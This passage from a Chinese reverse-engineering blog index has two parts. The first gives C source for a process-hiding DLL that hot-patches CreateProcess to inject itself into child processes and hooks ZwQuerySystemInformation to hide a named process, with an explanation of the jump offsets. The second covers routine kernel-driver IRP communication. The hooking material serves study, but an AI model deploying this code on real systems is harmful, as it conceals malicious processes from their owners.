*PSYSTEM_PROCESS_INFORMATION;typedef NTSTATUS (WINAPI *PFZWQUERYSYSTEMINFORMATION)(    SYSTEM_INFORMATION_CLASS SystemInformationClass,     PVOID SystemInformation,     ULONG SystemInformationLength,     PULONG ReturnLength);typedef BOOL (WINAPI *PFCREATEPROCESSA)(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation);typedef BOOL (WINAPI *PFCREATEPROCESSW)(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation);BYTE g_pOrgZwQSI[5] = &#123;0,&#125;;BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect, dwAddress;\tBYTE pBuf[5] = &#123;0xE9, 0, &#125;;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] == 0xE9 )\t\treturn FALSE;\tVirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\tmemcpy(pOrgBytes, pFunc, 5);\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc - 5;\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\tmemcpy(pFunc, pBuf, 5);\tVirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect, dwAddress;\tBYTE pBuf[5] = &#123; 0xE9, 0, &#125;;    BYTE pBuf2[2] = &#123; 0xEB, 0xF9 &#125;;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] == 0xEB )\t\treturn FALSE;\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc;\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\tmemcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] != 0xE9 )\t\treturn FALSE;\tVirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);\tmemcpy(pFunc, pOrgBytes, 5);\tVirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    BYTE pBuf[5] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;    BYTE pBuf2[2] = &#123; 0x8B, 0xFF &#125;;    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    if( pByte[0] != 0xEB )        return FALSE;    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) &#123;    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if( !OpenProcessToken(GetCurrentProcess(),                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \t\t\t              &amp;hToken) )    &#123;        printf(&quot;OpenProcessToken error: %u\\n&quot;, GetLastError());        return FALSE;    &#125;    if( !LookupPrivilegeValue(NULL,             // lookup privilege on local system                              lpszPrivilege,    // privilege to lookup                               &amp;luid) )          // receives LUID of privilege    &#123;        printf(&quot;LookupPrivilegeValue error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if( bEnablePrivilege )        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.    if( !AdjustTokenPrivileges(hToken,                                FALSE,                                &amp;tp,                                sizeof(TOKEN_PRIVILEGES),                                (PTOKEN_PRIVILEGES) NULL,                                (PDWORD) NULL) )    &#123;         printf(&quot;AdjustTokenPrivileges error: %u\\n&quot;, GetLastError() );         return FALSE;     &#125;     if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )    &#123;        printf(&quot;The token does not have the specified privilege. \\n&quot;);        return FALSE;    &#125;     return TRUE;&#125;BOOL InjectDll2(HANDLE hProcess, LPCTSTR szDllName)&#123;\tHANDLE hThread;\tLPVOID pRemoteBuf;\tDWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR);\tFARPROC pThreadProc;\tpRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,                                 MEM_COMMIT, PAGE_READWRITE);    if( pRemoteBuf == NULL )        return FALSE;\tWriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName,                        dwBufSize, NULL);\tpThreadProc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;),                                  &quot;LoadLibraryW&quot;);\thThread = CreateRemoteThread(hProcess, NULL, 0,                                  (LPTHREAD_START_ROUTINE)pThreadProc,                                  pRemoteBuf, 0, NULL);\tWaitForSingleObject(hThread, INFINITE);\t\tVirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);\tCloseHandle(hThread);\treturn TRUE;&#125;NTSTATUS WINAPI NewZwQuerySystemInformation(    SYSTEM_INFORMATION_CLASS SystemInformationClass, \tPVOID SystemInformation, \tULONG SystemInformationLength, \tPULONG ReturnLength)&#123;\tNTSTATUS status;\tFARPROC pFunc;\tPSYSTEM_PROCESS_INFORMATION pCur, pPrev;\tchar szProcName[MAX_PATH] = &#123;0,&#125;;\tunhook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;, g_pOrgZwQSI);\tpFunc = GetProcAddress(GetModuleHandleA(&quot;ntdll.dll&quot;),                            &quot;ZwQuerySystemInformation&quot;);\tstatus = ((PFZWQUERYSYSTEMINFORMATION)pFunc)             (SystemInformationClass, SystemInformation,               SystemInformationLength, ReturnLength);\tif( status != STATUS_SUCCESS )\t\tgoto __NTQUERYSYSTEMINFORMATION_END;\tif( SystemInformationClass == SystemProcessInformation )\t&#123;\t\tpCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;\t\twhile(TRUE)\t\t&#123;            if(pCur-&gt;Reserved2[1] != NULL)            &#123;                if(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[1], STR_HIDE_PROCESS_NAME))\t\t\t    &#123;\t\t\t\t    if(pCur-&gt;NextEntryOffset == 0)\t\t\t\t\t    pPrev-&gt;NextEntryOffset = 0;\t\t\t\t    else\t\t\t\t\t    pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;\t\t\t    &#125;\t\t\t    else\t\t\t\t\t\t    pPrev = pCur;\t// 盔窍绰 橇肺技胶甫 给 茫篮 版快父 pPrev 技泼            &#125;\t\t\tif(pCur-&gt;NextEntryOffset == 0)\t\t\t\tbreak;\t\t\tpCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur-&gt;NextEntryOffset);\t\t&#125;\t&#125;__NTQUERYSYSTEMINFORMATION_END:\thook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;,                  (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);\treturn status;&#125;BOOL WINAPI NewCreateProcessA(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation)&#123;    BOOL bRet;    FARPROC pFunc;    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;CreateProcessA&quot;);    pFunc = (FARPROC)((DWORD)pFunc + 2);    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,                                     lpCommandLine,                                     lpProcessAttributes,                                     lpThreadAttributes,                                     bInheritHandles,                                     dwCreationFlags,                                     lpEnvironment,                                     lpCurrentDirectory,                                     lpStartupInfo,                                     lpProcessInformation);    //向生成的子进程注入 stealth3.dll    if( bRet )        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);    return bRet;&#125;BOOL WINAPI NewCreateProcessW(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation)&#123;    BOOL bRet;    FARPROC pFunc;    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;CreateProcessW&quot;);    pFunc = (FARPROC)((DWORD)pFunc + 2);    bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,                                     lpCommandLine,                                     lpProcessAttributes,                                     lpThreadAttributes,                                     bInheritHandles,                                     dwCreationFlags,                                     lpEnvironment,                                     lpCurrentDirectory,                                     lpStartupInfo,                                     lpProcessInformation);    //向生成的子进程注入 stealth3.dll    if( bRet )        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);    return bRet;&#125;BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123;    char            szCurProc[MAX_PATH] = &#123;0,&#125;;    char            *p = NULL;    // 异常处理使注入不会发生在HideProc2.exe进程    GetModuleFileNameA(NULL, szCurProc, MAX_PATH);    p = strrchr(szCurProc, &#x27;\\\\&#x27;);    if( (p != NULL) &amp;&amp; !_stricmp(p+1, &quot;HideProc2.exe&quot;) )        return TRUE;    // change privilege    SetPrivilege(SE_DEBUG_NAME, TRUE);    switch( fdwReason )    &#123;        case DLL_PROCESS_ATTACH :             // hook            hook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessA&quot;,                              (PROC)NewCreateProcessA);            hook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessW&quot;,                              (PROC)NewCreateProcessW);            hook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;,                          (PROC)NewZwQuerySystemInformation, g_pOrgZwQSI);            break;        case DLL_PROCESS_DETACH :            // unhook            unhook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessA&quot;);            unhook_by_hotpatch(&quot;kernel32.dll&quot;, &quot;CreateProcessW&quot;);            unhook_by_code(&quot;ntdll.dll&quot;, &quot;ZwQuerySystemInformation&quot;,                            g_pOrgZwQSI);            break;    &#125;    return TRUE;&#125;\n\nhook_by_hotpatch()该函数运用热补丁技术钩取API\n123456789101112131415161718192021222324252627BOOL hook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew)&#123;\tFARPROC pFunc;\tDWORD dwOldProtect, dwAddress;\tBYTE pBuf[5] = &#123; 0xE9, 0, &#125;;    BYTE pBuf2[2] = &#123; 0xEB, 0xF9 &#125;;\tPBYTE pByte;\tpFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);\tpByte = (PBYTE)pFunc;\tif( pByte[0] == 0xEB )\t\treturn FALSE;\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)\tdwAddress = (DWORD)pfnNew - (DWORD)pFunc;\tmemcpy(&amp;pBuf[1], &amp;dwAddress, 4);\tmemcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);\tVirtualProtect((LPVOID)((DWORD)pFunc - 5), 7, dwOldProtect, &amp;dwOldProtect);\treturn TRUE;&#125;\n\n使用热补丁技术钩取API时，操作顺序非常重要。首先要将API起始地址上方的NOP*5指令修改为JMP XXXXXXXX。通过下面公式很容易求出XXXXXXXX值（即上述代码中dwAddress变量），计算公式如下：\n1dwAddress=(DWORD)pfnNew - (DWORD)pFunc\n\n\n\n\n\n\n\n\n\n\n上述公式与之前讲解的inline hook函数时介绍的地址计算公式实际上是一样的。\nXXXXXXXX&#x3D;要跳转的地址-当前指令地址-当前指令长度（5）\n当前指令（NOP*5）地址&#x3D;pFunc-5，所以上述公式可做如下修改：\nXXXXXXXX&#x3D;(DWORD)pfnNew - ((DWORD)pFunc - 5) - 5\n​                &#x3D;(DWORD)pfnNew - (DWORD)pFunc\n*pfnNew &#x3D; 用户钩取函数\n*pFunc &#x3D; 原API地址\n求得XXXXXXXX值后，使用下述代码将NOP*5指令修改为JMP XXXXXXXX指令。\n12memcpy(&amp;pBuf[1], &amp;dwAddress, 4);memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);\n\n接下来，将位于API起始地址处的MOV EDI,EDI指令（2个字节大小）替换为JMP YY指令。\n1memcpy(pFunc, pBuf2, 2);\n\n\n\n\n\n\n\n\n\n\n使用JMP YY指令时，要先计算出YY值，计算公式与前面相同。\nYY&#x3D;要跳转的地址-当前指令地址-当前指令长度（2）\n要跳转的地址是pFunc-5，当前指令地址为pFunc，YY值计算如下：\nYY&#x3D;(pFunc-5)-pFunc-2&#x3D;-7&#x3D;0xF9\n热补丁技术中，YY值总为0xF9，将其硬编码到源代码就可以了（0xF9是-7的”2的补码”形式）。\nunhook_by_hotpatch()该函数用于脱钩\n1234567891011121314151617181920212223242526BOOL unhook_by_hotpatch(LPCSTR szDllName, LPCSTR szFuncName)&#123;    FARPROC pFunc;    DWORD dwOldProtect;    PBYTE pByte;    BYTE pBuf[5] = &#123; 0x90, 0x90, 0x90, 0x90, 0x90 &#125;;    BYTE pBuf2[2] = &#123; 0x8B, 0xFF &#125;;    pFunc = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);    pByte = (PBYTE)pFunc;    if( pByte[0] != 0xEB )        return FALSE;    VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);    // 1. NOP (0x90)    memcpy((LPVOID)((DWORD)pFunc - 5), pBuf, 5);        // 2. MOV EDI, EDI (0x8BFF)    memcpy(pFunc, pBuf2, 2);    VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &amp;dwOldProtect);    return TRUE;&#125;\n\nNewCreateProcessA()123456789101112131415161718192021222324252627282930313233343536BOOL WINAPI NewCreateProcessA(    LPCTSTR lpApplicationName,    LPTSTR lpCommandLine,    LPSECURITY_ATTRIBUTES lpProcessAttributes,    LPSECURITY_ATTRIBUTES lpThreadAttributes,    BOOL bInheritHandles,    DWORD dwCreationFlags,    LPVOID lpEnvironment,    LPCTSTR lpCurrentDirectory,    LPSTARTUPINFO lpStartupInfo,    LPPROCESS_INFORMATION lpProcessInformation)&#123;    BOOL bRet;    FARPROC pFunc;    //调用原始API    pFunc = GetProcAddress(GetModuleHandleA(&quot;kernel32.dll&quot;), &quot;CreateProcessA&quot;);    pFunc = (FARPROC)((DWORD)pFunc + 2);    bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,                                     lpCommandLine,                                     lpProcessAttributes,                                     lpThreadAttributes,                                     bInheritHandles,                                     dwCreationFlags,                                     lpEnvironment,                                     lpCurrentDirectory,                                     lpStartupInfo,                                     lpProcessInformation);    //向生成的子进程注入 stealth3.dll    if( bRet )        InjectDll2(lpProcessInformation-&gt;hProcess, STR_MODULE_NAME);    return bRet;&#125;\n\n可以看出，该函数不再进行脱钩、挂钩操作，且与已有函数根本的不同在于添加了计算pFunc的语句：\n1pFunc = (FARPROC)((DWORD)pFunc + 2);\n\n该代码语句用于1跳过位于API起始地址处的JMP YY指令（2个字节，原指令为MOV EDI,EDI），从紧接的下一条指令开始执行，与调用原API的效果一样。\n使用热补丁API钩取技术时要考虑的问题热补丁API钩取技术并不是万能的，使用时目标API必须满足它的使用条件（NOP*5指令+MOV EDI,EDI指令），但有些API却不满足这一条件，如kernel32.GetStartInfoA。所以使用前要确定其是否满足条件\n","slug":"HotFix Hook","date":"2022-03-28T03:12:13.000Z","categories_index":"","tags_index":"hook技术,逆向工程核心原理,API hook","author_index":"0netry"},{"id":"ba14c8c55e36720dc30bd604d682a355","title":"IRP Hook","content":"3环与0环通信（常规方式）本篇介绍一下3环与0环通信的原理（常规方式），介绍与之相关的结构体，对象等，最后代码实现并模拟操作系统进行3环和0环的通信。\n设备对象内核通信的对象内核中的通信，与应用层窗口间的通信类似，只是封装消息的结构体不同，接收消息结构体的对象不同\n\n\n窗口通信：\n1）消息结构体：MSG\n2）接收消息的对象：窗口对象（Hwnd）\n\n内核通信：\n1）消息结构体：IRP（I&#x2F;O Request Package）\n2）接收消息的对象：设备对象（DeviceObject）\n\n\n所以想要在内核通信，需要有(至少)一个用来接收和发送消息的设备对象。\n创建设备对象窗口对象的创建也与设备对象也有不少共同点，这里继续拿来类比\n\n窗口对象：1）可以创建多个\n2）需要指定父窗口\n\n设备对象：1）可以创建多个\n2）需要指定所属驱动对象\n\n\nWindows提供了内核函数IoCreateDevice用来创建设备对象，参考如下代码：\n1234567891011121314151617#define DEVICE_NAME L&quot;\\\\Device\\\\MyDevice&quot;\tPDEVICE_OBJECT pDeviceObj = NULL;UNICODE_STRING DeviceName;RtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);NTSTATUS status = IoCreateDevice(pDriverObj,\t0,\t&amp;DeviceName,\tFILE_DEVICE_UNKNOWN,\t0,\tFALSE,\t&amp;pDeviceObj); if (status != STATUS_SUCCESS) &#123;\tDbgPrint(&quot;Device Create Failed!\\n&quot;);\treturn status;&#125;\n\n\npDriverObj：指定该设备创建后属于哪个驱动对象（PDRIVER_OBJECT）\n&amp;DeviceName：定义了一个DEVICE_NAME的宏，被用来初始化设备对象的名字。这个名字不能随便改（即”\\Device\\xxxxx”形式），在设备创建时，会根据设备名，将该设备挂到一个名为Device的树形结构中，几乎所有设备都挂在这。若改变此值，则会挂到其它树中。\nFILE_DEVICE_UNKNOWN：该处填写设备的类型，由于我们并没有实际的设备，所以选择UNKNOWN\n&amp;pDeviceObj：这个参数可以看作是一个二级指针，它指向一个地址。这个地址存着一个指针pDeviceObj，这个指针指向一个设备结构体。另一个要说明的是，这个参数是一个OUT类型的参数，原本pDeviceObj指向的内容是空的，在执行完设备创建的函数后，其指向创建出的设备对象。\n\n以上为几个比较关键的参数介绍，其余参数按照上述代码填写即可，具体含义可以参考官方文档\n数据传输方式\n首先查看一下设备对象这个结构体，发现它有很多字段，这里我们只需要关注其中一个，就是Flags，这是一个四字节的值，设置了3环和0环数据交互的方式。语法如下：\n12//这里必须是“|=”，不能直接写成“=”pDeviceObj-&gt;Flags |= DO_BUFFERED_IO;\n\n来看看有哪几种方式：\n\n缓冲区方式读写（DO_BUFFERED_IO）：I&#x2F;O管理器会在内核空间中分配一块内存，把用户空间的数据复制到这块内存中，这样内核程序就可以访问这些数据，实现数据通信。适合数据量较小时使用。（之前介绍的跨进程读取内存用的就是这种方法）\n直接方式读写（DO_DIRECT_IO）：I&#x2F;O管理器会将用户空间内的某片内存对应的物理页锁住，同时在内核空间再映射一份，这样内核空间线性地址与用户空间线性地址对应的是同一个物理页，这是双方均可以对这个物理页的内容进行读写，实现数据通信，此方法适合数据量较大时使用。（类似_KUSER_SHARED_DATA结构）\n默认方式读写（NEITHER_IO）：当创建完设备对象后，不设置Flags的值，使用的就是此类读写方式。默认读写方式，仅仅提供给内核程序用户空间的线性地址，直接进行数据的读取。这样做的坏处是，如果发生线程切换，读取的就不再是同一份数据，容易造成程序读取错误。\n\n通常情况下，我们实验的数据不会太大，主要采取DO_BUFFERED_IO这种方式。这里有一点要注意的是，在设置DeviceObject.Flags的值时，千万不要直接用”&#x3D;”，必须使用”|&#x3D;”，因为在创建设备对象结构体时，Flags是有初始值的，若这里直接给Flags赋值，会刷新掉之前的初始值，导致程序执行时发生错误（驱动技仅能成功执行一次，第二次会失败）。\n设置符号链接Windows规定，应用层的程序是不能直接访问设备对象的，所以符号链接诞生了。符号链接可以与设备对象绑定，这样应用层的程序就可以通过符号链接进行对设备对象的访问。符号链接在内核与3环的形式有所不同：\n\n内核：符号链接以”\\??\\“开头，例如C盘就是”\\??\\C:”\n用户模式：符号链接以”\\\\.\\“开头，例如C就算”\\\\.\\C:”\n\n具体在代码中还需要加入更多的“\\“用来转译符号，代码如下：\nRing012345#define SYM_LINK_NAME L&quot;\\\\??\\\\MyRing3Device&quot;UNICODE_STRING SymbolicLinkName;RtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);IoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);\n\nRing31234567891011#define SYM_LINK_NAME L&quot;\\\\\\\\.\\\\MyRing3Device&quot;//3环这里直接使用符号链接指向0环创建设备作为CreateFile的参数//不用再次设置符号链接，符号链接是在0环设置的，这里在3环主要介绍用法HANDLE hDevice = CreateFileW(\t\tSYM_LINK_NAME, \t\tGENERIC_READ | GENERIC_WRITE, \t\t0,\t\tNULL, \t\tOPEN_EXISTING, \t\tFILE_ATTRIBUTE_NORMAL, \t\tNULL);\n\nIRP与派遣函数对比消息处理先来看一张图\n\n继续拿3环的窗口应用来做对比\n\n用户空间：当用户单击鼠标时，会触发一个事件，操作系统会将这个事件的内容描述信息封装到一个MSG结构中，作为消息，发送给窗口对象，窗口对象接收到消息，会根据这个消息的类型，来执行相应的处理函数，我们称这种处理函数叫做回调函数。\n1）触发事件：鼠标点击等\n2）消息结构体：MSG\n3）消息接收对象：窗口对象\n4）处理函数：窗口回调函数\n\n内核空间：当3环程序调用CreateFile函数时，这是操作系统会产生相应的IRP，这个IRP封装了3环程序调用的相关描述信息，接着会把IRP发送给内核空间的设备对象，设备对象会解析IRP，然后会根据IRP提供的信息，执行相应的派遣函数\n1）触发事件：3环程序调用CreateFile函数等\n2）消息结构体：IRP\n3）消息接收对象：设备对象\n4）处理函数：派遣函数\n\n\nIRP的类型正如3环的窗口对象，在接收到不同类型消息时会执行不同的回调函数。当应用层通过CreateFile，ReadFile，WriteFile，CloseHandle等函数对设备进行操作时，也会使操作系统产生不同种类的IRP，这里简要总结一下部分3环函数与IRP的对应关系：\n\n\n\n应用层函数\nIRP种类\n\n\n\nCreateFile\nIRP_MJ_CREATE\n\n\nReadFile\nIRP_MJ_READ\n\n\nWriteFile\nIRP_MJ_WRITE\n\n\nCloseHandle\nIRP_MJ_CLOSE\n\n\nDeviceIoControl\nIRP_MJ_DEVICE_CONTROL\n\n\n派遣函数1）注册派遣函数\n当IRP传递给设备对象后，会根据IRP的种类调用特定的派遣函数。不同的IRP对应不同的派遣函数，NT框架预定了28（0x1C）种派遣函数，可以在驱动对象MajorFunction数组中注册这些派遣函数 \n\n代码示例：\n123//这里仅设置了两个用来演示pDriverObj-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;pDriverObj-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;\n\n其中IrpCreateProc和IrpCloseProc都是我们需要自己定义的派遣函数，遵守一定的格式\n2）派遣函数格式\n这里以IrpCreateProc来举例：\n1234567891011NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Create Dispatch Function...\\n&quot;);\t/*\t\t处理自己的业务\t*/    \tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;\n\n\n参数：\n1）设备对象指针\n2）IRP指针\n\nIRP是一个结构体，通过指针可以指向IRP内部的一个字段IoStatus（_IO_STATUS_BLOCK结构），该结构中有两个字段：\n1）Status：三环程序调用GetLastError得到的就是这个值\n2）Information：返回给3环多少数据，没有则填0\n\nIoCompleteRequest：表示调用方已完成所有I&#x2F;O请求处理操作，并将给定的IRP返回给I&#x2F;O管理器\n\n\n以上是必须设置的值&#x2F;执行的语句，完成后，即可\n代码实现有了以上基础后就可以实现简单的3环和0环的通信了，这里附上代码：\nRing01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &quot;ntifs.h&quot;#define DEVICE_NAME L&quot;\\\\Device\\\\MyDevice&quot;#define SYM_LINK_NAME L&quot;\\\\??\\\\MyRing3Device&quot;#define OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj);NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);//Driver Entry                                   NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) &#123;\tDbgPrint(&quot;Driver is running!\\n&quot;);\tPDEVICE_OBJECT pDeviceObj = NULL;\tNTSTATUS status = 0;\t//Create Deivce Object\tUNICODE_STRING DeviceName;\tRtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);\tstatus = IoCreateDevice(pDriverObj,\t\t0,\t\t&amp;DeviceName,\t\tFILE_DEVICE_UNKNOWN,\t\t0,\t\tFALSE,\t\t&amp;pDeviceObj); \tif (status != STATUS_SUCCESS) &#123;\t\tDbgPrint(&quot;Device Create Failed!\\n&quot;);\t\treturn status;\t&#125;\telse &#123;\t\tDbgPrint(&quot;Device Create Success!\\n&quot;);\t&#125;\t//Set Communicate Ways\t//注意这里一定要用&quot;|=&quot;, 而不能直接用&quot;=&quot;,因为在创建Device\tpDeviceObj-&gt;Flags |= DO_BUFFERED_IO;\t//Create Symbollic Link\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);\t//Set Dispatch Function\tpDriverObj-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;\tpDriverObj-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;\t//Set Unload Function\tpDriverObj-&gt;DriverUnload = Drvier_Unload;\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Create Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Close Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj) &#123;\t//Delete SymbolicLink\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoDeleteSymbolicLink(&amp;SymbolicLinkName);\t//Delete Deivce\tIoDeleteDevice(pDriverObj-&gt;DeviceObject);\tDbgPrint(&quot;Unload Success!\\n&quot;);&#125;\n\nRing31234567891011121314151617181920212223242526272829303132333435363738#include &quot;stdafx.h&quot;#include &quot;Windows.h&quot;#include &quot;winioctl.h&quot;#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)#define SYM_LINK_NAME 